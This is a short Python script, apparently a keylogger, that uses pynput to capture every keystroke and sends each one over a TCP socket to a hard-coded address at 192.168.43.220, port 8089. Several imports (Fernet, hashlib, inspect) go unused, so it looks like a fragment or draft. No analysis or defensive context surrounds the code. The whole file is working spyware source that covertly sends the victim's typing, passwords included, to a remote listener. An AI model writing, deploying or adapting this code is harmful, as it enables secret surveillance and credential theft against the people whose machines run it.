from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import inspect
import hashlib
import socket

def on_press(key):
    # record keystrokes
    msg = str(key)
    clientsocket.send(msg.encode())

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('192.168.43.220', 8089))

with Listener(
    on_press=on_press
) as listener:
    listener.join()
